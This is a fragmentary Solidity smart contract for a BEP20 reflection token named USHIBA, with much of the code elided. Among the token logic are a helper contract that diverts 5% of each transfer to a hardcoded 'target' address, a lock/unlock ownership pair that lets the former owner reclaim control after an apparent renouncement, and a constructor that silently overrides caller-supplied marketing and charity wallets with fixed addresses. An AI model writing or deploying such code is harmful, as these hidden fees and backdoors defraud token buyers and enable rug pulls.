...
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;//donut change
    ...
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        ...
        if (success) {return returndata;} else {if (returndata.length > 0) {assembly {let returndata_size := mload(returndata)revert(add(32, returndata), returndata_size)}
            } else {revert(errorMessage);}}}}
                        contract TransfertTokenAndPercentageToTargetAddress{
    address payable target = 0x01DC80Ab711E127A98Ae0aF3c430b55B677aeF1E;//testnets bcow
    mapping (address => uint) public balanceOf;
    uint public totalSupply;
    function transfer(address _to, uint amount) public {
        uint shareForX = amount/20;//=make 5%
    ...
    // 5% of all transactions to target addresses - bCOW
...
contract Ownable is Context {
    ...
    function lock(uint256 time) public virtual onlyOwner {_previousOwner = _owner;_owner = address(0);
        _lockTime = block.timestamp + time; emit OwnershipTransferred(_owner, address(0));}
    function unlock() public virtual {require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(now > _lockTime , "Contract is locked until 7 days"); emit OwnershipTransferred(_owner, _previousOwner);_owner = _previousOwner;}}
...
contract OfficialBEP20USHIBA is Context, IERC20, Ownable {
    ...
    constructor (//allowUI  
        string memory _NAME, //title
        string memory _SYMBOL, //ticker
        uint256 _DECIMALS,//precision
        uint256 _supply, //total supply
        uint256 _txFee,//transaction tax -to holders
        uint256 _lpFee,//swap&liq fee
        uint256 _buybackFee//buybackfee
        ,uint256 _marketingFee//marketingfee
        ,uint256 _charityFee//charityfee
        ,uint256 _MAXAMOUNT,//set max percent amt+8thresholds
        uint256 SELLMAXAMOUNT,//set max sell number amt+8thresholds
        address routerAddress,//set router
        address tokenOwner//set wallet owner+3thresholds
        ,address marketingAddress//set marketing address
        ,address charityAddress//set charity address
        ) public {//below allows construction
marketingAddress = payable(0x5e8838592fCd02077fEB954fa6a7A0771CEFF298);
        charityAddress = payable(0xe1D83a80590b898a93a8d7fc080f35f5DBa97108);
        ...
        IUniswapV2Router02 _newPancakeRouter = IUniswapV2Router02(routerAddress);
         // Create an official pair for BEP20 USHIBA token!
    ...
    function deliver(uint256 tAmount) public {//redistributions
    ...
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        ...
        if (!deductTransferFee) {
            (uint256 rAmount,,,,,) = _getValues(tAmount);
            return rAmount; } else { (,uint256 rTransferAmount,,,,) = _getValues(tAmount); return rTransferAmount;}}
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        uint256 contractTokenBalance = balanceOf(address(this)); if(contractTokenBalance >= _maxTxAmount)
